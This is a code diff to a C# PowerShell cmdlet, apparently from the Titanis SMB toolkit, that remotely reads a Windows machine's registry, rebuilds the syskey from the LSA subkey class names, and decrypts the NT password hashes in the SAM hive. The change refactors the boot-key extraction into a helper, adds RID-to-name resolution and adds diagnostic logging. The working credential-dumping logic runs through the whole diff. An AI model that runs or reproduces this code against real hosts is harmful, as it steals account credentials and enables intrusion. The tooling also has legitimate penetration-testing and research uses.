@@ -30,12 +30,9 @@ namespace Titanis.Tbo.Smb2.PowerShell
 	[OutputType(typeof(TboRegSamHashInfo))]
 	public sealed class GetTBORegSamHashes : TboRegCmdlet
 	{
-		private const string LsaKeyPath = @"SYSTEM\CurrentControlSet\Control\Lsa";
 		private const string SamAccountPath = @"SAM\SAM\Domains\Account";
 		private const string SamUsersPath = @"SAM\SAM\Domains\Account\Users";
-		private const ulong BootKeyByteSwap = 0xEC6B4D50F91273A8;
 		private const RegistryKeyOptions SamKeyOptions = RegistryKeyOptions.BackupRestore;
-		private static readonly string[] BootKeySubkeys = { "JD", "Skew1", "GBG", "Data" };
 		private const int SamUserAttrCount = 17;
 		private const int SamUserAttrInfoSize = 12;
 
@@ -49,13 +46,17 @@ namespace Titanis.Tbo.Smb2.PowerShell
 				IRegistryKey? localMachineKey = null;
 				try
 				{
+					LogDiagnostic(smb, $"Get-TBORegSamHashes: opening HKLM root on {this.ServerName}.");
 					localMachineKey = session.Client.OpenRootKey(
 						RegistryRootKey.LocalMachine,
 						RegistryAccessRights.EnumerateSubkeys | RegistryAccessRights.QueryValue,
 						cancellationToken).GetAwaiter().GetResult();
 
-					syskey = ExtractSyskey(localMachineKey, cancellationToken);
+					LogDiagnostic(smb, $"Get-TBORegSamHashes: HKLM opened on {this.ServerName}.");
+					syskey = ExtractSyskey(smb, localMachineKey, cancellationToken);
+					LogDiagnostic(smb, $"Get-TBORegSamHashes: syskey extracted on {this.ServerName}.");
 					store = ExtractSamStore(smb, localMachineKey, syskey, cancellationToken);
+					LogDiagnostic(smb, $"Get-TBORegSamHashes: SAM store {(store?.HasMasterKey == true ? "has" : "missing")} master key on {this.ServerName}.");
 					nameLookup = TryReadSamUserNames(smb, localMachineKey, cancellationToken);
 				}
 				catch (Exception ex) when (IsRetryableInitException(ex))
@@ -77,36 +78,65 @@ namespace Titanis.Tbo.Smb2.PowerShell
 				try
 				{
 					List<RegistrySubkeyInfo> users;
-					using var usersKey = localMachineKey!.OpenSubkey(
-						SamUsersPath,
-						RegistryAccessRights.EnumerateSubkeys,
-						SamKeyOptions,
-						cancellationToken).GetAwaiter().GetResult();
-					try
+					List<(string KeyName, uint Rid, string? Name)> userEntries = new();
+					if (nameLookup.Count > 0)
 					{
-						users = CollectSubkeys(usersKey, cancellationToken);
+						LogDiagnostic(smb, $"Get-TBORegSamHashes: using SAM Names map ({nameLookup.Count} entries) to resolve user RIDs.");
+						foreach (var entry in nameLookup)
+						{
+							var rid = entry.Key;
+							var keyName = rid.ToString("X8");
+							userEntries.Add((keyName, rid, entry.Value));
+						}
 					}
-					catch (Exception ex)
+					else
 					{
-						smb.LogException("Get-TBORegSamHashes failed to enumerate SAM users", ex);
-						this.WriteWarning($"Get-TBORegSamHashes failed to enumerate SAM users: {ex.Message}");
-						return;
-					}
-
-					foreach (var userKeyInfo in users)
-					{
-						var keyName = userKeyInfo.KeyName;
-						if (string.Equals(keyName, "Names", StringComparison.OrdinalIgnoreCase))
-							continue;
-
-						if (!uint.TryParse(keyName, NumberStyles.HexNumber, CultureInfo.InvariantCulture, out var rid))
-							continue;
-
+						LogDiagnostic(smb, $"Get-TBORegSamHashes: opening SAM Users key on {this.ServerName}.");
+						using var usersKey = localMachineKey!.OpenSubkey(
+							SamUsersPath,
+							RegistryAccessRights.EnumerateSubkeys,
+							SamKeyOptions,
+							cancellationToken).GetAwaiter().GetResult();
 						try
 						{
-							using var userKey = usersKey.OpenSubkey(keyName, RegistryAccessRights.QueryValue, RegistryKeyOptions.BackupRestore, cancellationToken).GetAwaiter().GetResult();
+							users = CollectSubkeys(usersKey, cancellationToken);
+							LogDiagnostic(smb, $"Get-TBORegSamHashes: enumerated {users.Count} SAM user subkeys on {this.ServerName}.");
+						}
+						catch (Exception ex)
+						{
+							smb.LogException("Get-TBORegSamHashes failed to enumerate SAM users", ex);
+							this.WriteWarning($"Get-TBORegSamHashes failed to enumerate SAM users: {ex.Message}");
+							return;
+						}
+
+						foreach (var userKeyInfo in users)
+						{
+							var keyName = userKeyInfo.KeyName;
+							if (string.Equals(keyName, "Names", StringComparison.OrdinalIgnoreCase))
+								continue;
+
+							if (!uint.TryParse(keyName, NumberStyles.HexNumber, CultureInfo.InvariantCulture, out var rid))
+								continue;
+
+							userEntries.Add((keyName, rid, null));
+						}
+					}
+
+					foreach (var entry in userEntries)
+					{
+						var keyName = entry.KeyName;
+						var rid = entry.Rid;
+						try
+						{
+							LogDiagnostic(smb, $"Get-TBORegSamHashes: reading SAM user {keyName} on {this.ServerName}.");
+							using var userKey = localMachineKey!.OpenSubkey(
+								CombineSubkeyPath(SamUsersPath, keyName),
+								RegistryAccessRights.QueryValue,
+								RegistryKeyOptions.BackupRestore,
+								cancellationToken).GetAwaiter().GetResult();
 							var valueInfo = userKey.GetValue("V", cancellationToken).GetAwaiter().GetResult();
 							var bytes = ExtractValueBytes(valueInfo);
+							LogDiagnostic(smb, $"Get-TBORegSamHashes: SAM user {keyName} value size {(bytes?.Length ?? 0)} bytes on {this.ServerName}.");
 							if (bytes == null || bytes.Length == 0)
 							{
 								this.WriteWarning($"Get-TBORegSamHashes failed to read SAM user {keyName}: value is empty.");
@@ -122,6 +152,8 @@ namespace Titanis.Tbo.Smb2.PowerShell
 							var user = new SamUserRegistryObject(store, rid, ImmutableArray<byte>.Empty, ImmutableArray.Create(bytes));
 							var ntHash = user.GetDecryptedNtHash();
 							var accountName = user.AccountName;
+							if (string.IsNullOrWhiteSpace(accountName) && !string.IsNullOrWhiteSpace(entry.Name))
+								accountName = entry.Name;
 							if (string.IsNullOrWhiteSpace(accountName) && nameLookup.TryGetValue(rid, out var mappedName))
 								accountName = mappedName;
 
@@ -149,40 +181,17 @@ namespace Titanis.Tbo.Smb2.PowerShell
 			});
 		}
 
-		private byte[] ExtractSyskey(IRegistryKey localMachineKey, CancellationToken cancellationToken)
+		private byte[] ExtractSyskey(ISmbProviderInfo smb, IRegistryKey localMachineKey, CancellationToken cancellationToken)
 		{
+			LogDiagnostic(smb, $"Get-TBORegSamHashes: opening LSA key {RegistryBootKeyReader.LsaKeyPath}.");
 			using var lsaKey = localMachineKey.OpenSubkey(
-				LsaKeyPath,
+				RegistryBootKeyReader.LsaKeyPath,
 				RegistryAccessRights.QueryValue,
 				SamKeyOptions,
 				cancellationToken).GetAwaiter().GetResult();
+			LogDiagnostic(smb, $"Get-TBORegSamHashes: LSA key opened for {RegistryBootKeyReader.LsaKeyPath}.");
 
-			byte[] syskey = new byte[16];
-			ulong swapKey = BootKeyByteSwap;
-			foreach (var subkeyName in BootKeySubkeys)
-			{
-				using var subkey = lsaKey.OpenSubkey(
-					subkeyName,
-					RegistryAccessRights.QueryValue,
-					SamKeyOptions,
-					cancellationToken).GetAwaiter().GetResult();
-				var info = subkey.QueryInfo(includeClass: true, cancellationToken).GetAwaiter().GetResult();
-				var className = info.ClassName?.TrimEnd('\0');
-				if (string.IsNullOrWhiteSpace(className))
-					throw new InvalidOperationException($"Registry class for {lsaKey.KeyPath}\\{subkeyName} is empty.");
-
-				var bytes = BinaryHelper.ParseHexString(className.AsSpan());
-				if (bytes.Length < 4)
-					throw new InvalidOperationException($"Registry class for {lsaKey.KeyPath}\\{subkeyName} does not contain 4 bytes.");
-
-				for (int i = 0; i < 4; i++)
-				{
-					syskey[(int)(swapKey & 0x0F)] = bytes[i];
-					swapKey >>= 4;
-				}
-			}
-
-			return syskey;
+			return RegistryBootKeyReader.ExtractBootKey(lsaKey, lsaKey.KeyPath, cancellationToken, msg => LogDiagnostic(smb, msg));
 		}
 
 		private SamStore? ExtractSamStore(
@@ -191,6 +200,7 @@ namespace Titanis.Tbo.Smb2.PowerShell
 			byte[] syskey,
 			CancellationToken cancellationToken)
 		{
+			LogDiagnostic(smb, $"Get-TBORegSamHashes: opening SAM account key {SamAccountPath}.");
 			using var accountKey = localMachineKey.OpenSubkey(
 				SamAccountPath,
 				RegistryAccessRights.QueryValue,
@@ -198,6 +208,7 @@ namespace Titanis.Tbo.Smb2.PowerShell
 				cancellationToken).GetAwaiter().GetResult();
 			var usersF = accountKey.GetValue("F", cancellationToken).GetAwaiter().GetResult();
 			var fBytes = ExtractValueBytes(usersF);
+			LogDiagnostic(smb, $"Get-TBORegSamHashes: SAM account F value size {(fBytes?.Length ?? 0)} bytes.");
 			if (fBytes == null || fBytes.Length < 136)
 			{
 				this.WriteWarning("Get-TBORegSamHashes failed to read SAM account data: value is too short.");
@@ -246,6 +257,7 @@ namespace Titanis.Tbo.Smb2.PowerShell
 
 			try
 			{
+				LogDiagnostic(smb, $"Get-TBORegSamHashes: opening SAM user Names key {SamUsersPath}\\Names.");
 				using var namesKey = localMachineKey.OpenSubkey(
 					CombineSubkeyPath(SamUsersPath, "Names"),
 					RegistryAccessRights.EnumerateSubkeys | RegistryAccessRights.QueryValue,
@@ -253,6 +265,7 @@ namespace Titanis.Tbo.Smb2.PowerShell
 					cancellationToken).GetAwaiter().GetResult();
 
 				var subkeys = CollectSubkeys(namesKey, cancellationToken);
+				LogDiagnostic(smb, $"Get-TBORegSamHashes: enumerated {subkeys.Count} SAM name entries.");
 				foreach (var subkeyInfo in subkeys)
 				{
 					var name = subkeyInfo.KeyName;
@@ -261,9 +274,15 @@ namespace Titanis.Tbo.Smb2.PowerShell
 
 					try
 					{
+						LogDiagnostic(smb, $"Get-TBORegSamHashes: reading SAM name entry {name}.");
 						using var userKey = namesKey.OpenSubkey(name, RegistryAccessRights.QueryValue, RegistryKeyOptions.BackupRestore, cancellationToken).GetAwaiter().GetResult();
-						var valueInfo = userKey.GetValue(string.Empty, cancellationToken).GetAwaiter().GetResult();
-						if (TryReadRid(valueInfo, out var rid))
+						var valueInfo = userKey.GetValue(null, cancellationToken).GetAwaiter().GetResult();
+						uint rid;
+						if (!TryReadRid(valueInfo, out rid))
+						{
+							valueInfo = userKey.GetValue(string.Empty, cancellationToken).GetAwaiter().GetResult();
+						}
+						if (TryReadRid(valueInfo, out rid))
 							results[rid] = name;
 					}
 					catch (Exception ex)
@@ -287,6 +306,14 @@ namespace Titanis.Tbo.Smb2.PowerShell
 			if (info.TypedValue is byte[] typedBytes && typedBytes.Length > 0)
 				return typedBytes;
 			return null;
+		}
+
+		private static void LogDiagnostic(ISmbProviderInfo smb, string message)
+		{
+			if (smb is SmbProviderInfo provider)
+			{
+				provider.LogDiagnostic(message);
+			}
 		}
 
 		private static bool TryReadRid(RegistryValueInfo info, out uint rid)
